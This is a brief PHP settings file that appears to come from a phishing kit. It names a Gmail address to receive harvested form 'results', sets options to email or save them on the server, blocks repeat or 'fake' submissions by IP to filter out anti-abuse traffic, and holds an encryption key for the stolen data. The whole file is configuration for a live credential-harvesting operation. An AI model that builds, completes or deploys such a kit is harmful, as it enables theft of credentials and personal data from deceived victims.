<?php
$Your_Email = "northbryan4u@gmail.com";  // Set your email
$Send_Log=1;  // Sends results to above email
$Save_Log=0;  // Saves results to server within a txt file
$Abuse_Filter=1; // Abuse filter: This blocks users from sending you abuse
$One_Time_Access=0; // One Time Access: This blocks the users ip after the form has been submitted i.e. prevents users sending fake forms
$Encrypt=0; // Encrypt: This feature encrypts your results
$Key = 	"oL^11tj)1#B)Bh_1y0e.e252OT1ceZ"; // This key is used to decrypt results and can be changed
?>
